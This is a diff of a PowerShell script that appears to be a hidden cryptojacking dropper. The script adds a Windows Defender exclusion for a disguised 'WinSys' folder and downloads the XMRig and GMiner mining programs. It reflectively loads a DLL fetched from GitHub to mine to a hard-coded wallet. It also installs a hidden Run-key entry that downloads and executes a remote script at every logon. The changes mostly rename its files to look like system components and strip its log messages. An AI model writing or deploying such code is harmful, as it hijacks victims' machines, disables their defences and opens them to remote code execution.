@@ -3,9 +3,9 @@ $RepoName = "btcminer-"
 $DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll?v=$([Guid]::NewGuid().ToString())"
 $MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
 $GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
-$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr.$env:COMPUTERNAME"
+$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
 
-$StealthDir = "$env:LOCALAPPDATA\WinSysUpdates"
+$StealthDir = "$env:LOCALAPPDATA\WinSys"
 try { Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue } catch { }
 if (-not (Test-Path $StealthDir)) {
     New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
@@ -13,8 +13,8 @@ if (-not (Test-Path $StealthDir)) {
 
 $CpuZip = Join-Path $StealthDir "update_c.zip"
 $GpuZip = Join-Path $StealthDir "update_g.zip"
-$CpuExe = Join-Path $StealthDir "win_sys_x.exe"
-$GpuExe = Join-Path $StealthDir "win_sys_g.exe"
+$CpuExe = Join-Path $StealthDir "WinSys_x.exe"
+$GpuExe = Join-Path $StealthDir "WinSys_g.exe"
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
@@ -33,8 +33,8 @@ try {
     try {
         $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
         if ($vc) {
-            # Added VEN_1002 for AMD and match for Radeon/AMD strings
-            $GpuDetected = $vc | Where-Object { $_.Name -match "NVIDIA" -or $_.Name -match "AMD" -or $_.Name -match "Radeon" -or $_.PNPDeviceID -match "VEN_10DE" -or $_.PNPDeviceID -match "VEN_1002" }
+             # Detect NVIDIA (VEN_10DE) or AMD (VEN_1002)
+             $GpuDetected = $vc | Where-Object { $_.Name -match "NVIDIA" -or $_.Name -match "AMD" -or $_.Name -match "Radeon" -or $_.PNPDeviceID -match "VEN_10DE" -or $_.PNPDeviceID -match "VEN_1002" }
         }
     } catch { }
 
@@ -46,21 +46,18 @@ try {
         Move-Item $Unzipped.FullName -Destination $GpuExe -Force
     }
 
-    Write-Host "[*] Triggering Bridge.dll Reflective Load..."
     $dllBytes = $wc.DownloadData($DllUrl)
     $assembly = [System.Reflection.Assembly]::Load($dllBytes)
     $loader = $assembly.GetType("DateFundLoader")
     $startMethod = $loader.GetMethod("StartMiner")
     
-    $GpuArg = if ($GpuDetected) { [string]$GpuExe } else { "" }
-    Write-Host "[*] Invoking Miner Process..."
-    # Force everything into raw strings to kill the PSObject conversion bug for good
-    $p = [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet)
-    $startMethod.Invoke($null, $p)
+    $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
     
-    Write-Host "[*] Hooking Registry..."
+    # Invoking the 'Insane' Dynamic Manager
+    $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet))
+    
     $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $Name = "WinSysUpdater"
+    $Name = "WinSys"
     $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr -useb 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
     Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
     
